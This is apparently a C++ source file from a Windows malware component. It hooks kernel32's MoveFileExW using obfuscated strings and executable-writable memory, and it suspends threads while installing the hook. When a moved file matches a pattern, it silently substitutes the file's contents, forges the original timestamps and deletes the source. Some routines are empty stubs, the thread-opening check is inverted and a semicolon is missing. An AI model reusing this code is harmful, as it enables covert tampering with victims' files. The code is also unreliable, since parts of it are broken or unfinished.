/*
	KBRI_hd.cpp
	Main routines
*/

#include <windows.h>
#include <TlHelp32.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\CryptoStrings.h"

#include "APIHook.h"
#include "khdProcessing.h"

#include "KBRI_hd.h"


KHD_GLOBALS gKHD;


/*
	Retrieves and checks context of a thread for a match against forbidden regions.
	If such found, the thread is resumes for some period and suspended again, re-checking it once again.
	Max retry amount should be somewhat sane
*/
VOID khdCheckThreadContext(HANDLE hThread, LPVOID pForbiddenRegions)
{

}


/*
	Suspends all threads except current one.
	NB: it is essential for caller to specify a list of memory regions which are
	"forbidden" for freeze - if a thread stops somewhere there, it should be re-run to move out.
	This will prevent race conditions when hook is written directly on a suspended EIP contents, leading to unexpected results
*/
VOID khdSetOtherThreadsState(BOOL bDoFreeze)
{
	DWORD dwSelfTID = GetCurrentThreadId();
	DWORD dwSelfPID = GetCurrentProcessId();
	HANDLE hSnap = INVALID_HANDLE_VALUE;	// snapshot handle

	THREADENTRY32 te = { 0 };	// enum buffer

	HANDLE hThread = NULL;	// thread manipulation handle

	do {	// not a loop

		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hSnap == INVALID_HANDLE_VALUE) { DbgPrint("ERR: CreateToolhelp32Snapshot() failed, code %p", GetLastError()); break; }

		te.dwSize = sizeof(THREADENTRY32);
		if (!Thread32First(hSnap, &te)) { DbgPrint("ERR: Thread32First() failed %p", GetLastError()); break; }

		do {

			// check for pid & tid
			if ((te.th32OwnerProcessID == dwSelfPID) && (te.th32ThreadID != dwSelfTID)) {

				DbgPrint("processing tid %u bDoFreeze %u", te.th32ThreadID, bDoFreeze);

				if (!(hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION | SYNCHRONIZE, FALSE, te.th32ThreadID))) {
				
					// NB: error 0xB7 if attempting to open main process thread (wtf?), thus all this routines are useless

					if (bDoFreeze) { SuspendThread(hThread); khdCheckThreadContext(hThread, NULL); } else { ResumeThread(hThread); }

					CloseHandle(hThread);

				} else { DbgPrint("WARN: failed to open tid %u, le %p", te.th32ThreadID, GetLastError()); }

			} // thread found

		} while (Thread32Next(hSnap, &te));

	} while (FALSE);	// not a loop

	// cleanup
	if (hSnap) { CloseHandle(hSnap); }

}



/*
	cmd.exe on WinXP
	move c:\0\test.* Z:\VM-Trash-RW\a\

	0013F19C   4AD0BBA7  /CALL to MoveFileExW from cmd.4AD0BBA5
	0013F1A0   0013F410  |ExistingName = "c:\0\test.txt"
	0013F1A4   0013F618  |NewName = "Z:\VM-Trash-RW\a\test.txt"
	0013F1A8   00000002  \Flags = COPY_ALLOWED

*/
BOOL WINAPI hk_MoveFileExW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags)
{
	// ptrs allocated in case of file processed
	LPVOID pNewData = NULL;
	DWORD dwNewDataLen = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwLE;

	DWORD dwWritten;	// WriteFile()'s result

	FILETIME ftA = { 0 }, ftC = { 0 }, ftW = { 0 };	// filetimes of original file

	DbgPrint("lpExistingFileName=[%ws] lpNewFileName=[%ws] dwFlags=%04Xh", lpExistingFileName, lpNewFileName, dwFlags);

	// check if filename matches pattern and do internal work
	if ((kpCheckFile(lpExistingFileName, &pNewData, &dwNewDataLen, &ftC, &ftA, &ftW)) && pNewData && dwNewDataLen) {

		DbgPrint("NOTE: replacement triggered, new size %u", dwNewDataLen);

		// create new file
		hFile = CreateFile(lpNewFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) { 
#ifdef _DEBUG
			dwLE = GetLastError(); DbgPrint("ERR: CreateFile() failed, le %u", GetLastError()); SetLastError(dwLE); 
#endif
		return FALSE; }
		if (!WriteFile(hFile, pNewData, dwNewDataLen, &dwWritten, NULL)) {
#ifdef _DEBUG
			dwLE = GetLastError(); DbgPrint("ERR: WriteFile() failed, le %u", GetLastError()); SetLastError(dwLE);
#endif

			// free buffers
			my_free(pNewData);

			return FALSE;
		}
		FlushFileBuffers(hFile);

		SetFileTime(hFile, &ftC, &ftA, &ftW);

		CloseHandle(hFile);

		// remove existing file
		DeleteFile(lpExistingFileName);

		// all done ok
		SetLastError(0);
		return TRUE;
	} 

	// call orig func if nothing was processed
	return gKHD.p_MoveFileExW(lpExistingFileName, lpNewFileName, dwFlags);
}


/*
	Removes previously installed hooks when a new version requires our termination
*/
VOID khdRemoveHooks()
{
	// TO BE IMPLEMENTED

}



/*
	Performs hook installation on a running, possibly multi-threaded process
*/
VOID khdSetHooks()
{
	

	HMODULE hKernel32 = NULL;	
	LPSTR szS;
	LPWSTR wszS;

	// try to communicate with other copy to ask it for self-termination
	// ...

	// init hook-related internals
	memset(&gKHD, 0, sizeof(KHD_GLOBALS));

	// alloc RWE mem chunk to place all stubs from hooked functions
	gKHD.pStubs = VirtualAlloc(NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// suspend threads
	khdSetOtherThreadsState(TRUE);
	DbgPrint("other threads freezed");
	//Sleep(1000); // dbg sleep

	// query kernel32 handle
	wszS = CRSTRW("kernel32", "\xfd\x9f\x93\x05\xf5\x9f\x98\x08\xff\x89\x76\xe1\x5e\x35\x24");
	hKernel32 = GetModuleHandle(wszS);
	my_free(wszS);

	szS = CRSTRA("MoveFileExW", "\xfd\x3f\xe4\x05\xf6\x3f\xc9\x02\xfb\x22\x22\xe4\x01\xc2\x01\xd5\x1a\xba\x7f");
	hkHook(hKernel32, szS, &hk_MoveFileExW, (LPVOID)((SIZE_T)gKHD.pStubs + (0 * HOOK_STUB_MAXLEN)), (LPVOID *)&gKHD.p_MoveFileExW);
	my_free(szS);

	// resume other threads
	khdSetOtherThreadsState(FALSE);
	DbgPrint("other threads resumed")

}